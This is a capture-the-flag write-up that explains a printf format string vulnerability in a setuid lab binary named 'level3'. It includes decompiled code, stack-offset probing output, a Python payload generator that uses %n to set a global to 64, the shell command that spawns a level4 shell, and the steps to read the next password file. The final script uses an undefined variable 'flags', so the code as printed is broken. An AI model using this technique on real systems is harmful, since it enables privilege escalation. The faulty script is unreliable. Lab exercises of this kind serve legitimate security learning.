## Phase 1: Reconnaissance

We find a binary named `level3` in the home directory

Running the program allows us to input a string, which is then printed back to the screen

We copy the binary to our host machine for static analysis

---

## Phase 2: Static Analysis

Using **Ghidra**, we identify the main vulnerable function:

```c
void v(void)
{
    char buffer[520];

    fgets(buffer, 512, stdin);
    printf(buffer);    // Vulnerable?
    if (m == 64)
    {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}
```
- User input is read with `fgets()`
- However, the input is passed directly to `printf()` without using the `%s` parameter
- This introduces a format string vulnerability
- A global variable `m` is checked against the value 64
- If `m == 64`, a shell is spawned

---

## Phase 3: First Attempt

We attempt to modify `m` manually using gdb and confirm that setting `m = 64` does spawn a shell

However... when using gdb, the program drops its setuid bit, meaning the shell runs as level3 instead of level4

To keep level4 privileges, the binary must modify `m` by ITSELF. Without a debugger.

This means we must exploit the format string vulnerability in `printf()`

---

## Phase 4: Format String Vulnerability

When the program receives `printf("AAAA %x %x %x")`  

`printf()` pulls arguments from where it expects them to be on the stack, even if the caller didn’t provide any  

Some of our input bytes like `'AAAA'` will end up on the stack in places `printf()` will later interpret as arguments  

We passed NO variadic arguments, but `printf()` will still try to read them


- When printf sees `%x` it expects variadic arguments
- For each `%x`, it tries to fetch the memory location of where that variadic argument is supposed to be from the stack 
- Since there's none, it reads the whatever happens to be in that stack position (random stuff)  
- As we add more `%x`, it eventually starts reading the stack memory containing our buffer  

---

## Phase 5: Finding the Offset

We run the binary and probe the stack:
```console
./level3
AAAA %08x %08x %08x %08x %08x %08x
```

Output:
```console
AAAA 00000200 002e0ac0 001257d0 41414141 38302520 30252078
```

The value `41414141` confirms that our input (AAAA) is read as the 4th argument by `printf()`

---

## Phase 6: Locating the Target Variable

With `gdb` we analyze where `m` is being set (we use set disassembly-flavor intel)

```text
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
```
   
In intel syntax: `mov eax, [0x804988c]` or `mov eax, ds:0x804988c` = Go to address, get value

We see that it goes to memory address `0x804988c` and takes the data and stores it in `$eax`  

This tells us `m` is stored at address `0x0804988c`

---

## Phase 7: Writing to Memory with %n

Other than leaking info, `printf()` can also write to memory addresses with `%n`

For `%x`, `printf()` takes the next argument as an integer value and prints it

But with `%n`, `printf()` takes the next argument as an address and writes into that address



### The Plan:


- Since we know the address of `m` we can give that to `%n`
- We also know that at the 4th variadic call, `printf()` will take the next argument from the stack
- This means we can put in our initial buffer the address of `m` that will be fetched by `printf()`

But first we need to transform the address into little endian + raw bytes


Address of `m` in little endian:
```text
\x8c\x98\x04\x08
```

Initial test payload:
```shell
\x8c\x98\x04\x08 %08x %08x %08x %n
```


Inside gdb we can use this
`run < /tmp/payload`

And check if the value changed with
`x/wx 0x0804988c`


The initial exploit for this inside /tmp/exploit.py:
```python
#!/usr/bin/env python2
import os

# 0x804988c -> \x8c\x98\x04\x08
payload = '\x8c\x98\x04\x08' + ' %08x %08x %08x %n'

with open('/tmp/payload', 'wb') as f:
    f.write(payload)
print("Saved to /tmp/payload")

```


Inside `gdb` while inspecting the value of `0x804988c` we notice:

```shell
(gdb) ni
(gdb) x/wx 0x0804988c
0x804988c <m>:	0x00000000
(gdb) ni
(gdb) x/wx 0x0804988c
0x804988c <m>:	0x00000020
```

This successfully modifies `m`, confirming the exploit works

---

## Phase 8: Reaching m == 64

Now we need a value of 64 to enter inside that initial if condition
- Total characters so far: 4 (the address) + 9 (first %08x) + 9 (second %08x) + 9 (third %08x) = 31 bytes

So we need to add 33 more padding characters to reach 64


## Phase 9: Exploitation

We modify our initial exploit in /tmp/exploit.py:
```python
#!/usr/bin/env python2
import os


address = '\x8c\x98\x04\x08'
padding = 'A' * 33 # We add the remaining 33 bytes here to get to 64
n = '%n'

payload = address + flags + padding + n

with open('/tmp/payload', 'wb') as f:
    f.write(payload)
    
print("Saved to /tmp/payload")

```

We then run it:
```bash
cat /tmp/payload - | ./level3
```

Output:
```bash
Wait what?!
whoami
level4
```
## Phase 10: Retrieving the Next Password

Now running as level4, we retrieve the next flag:
```console
cd /home/user/level4
cat .pass
```

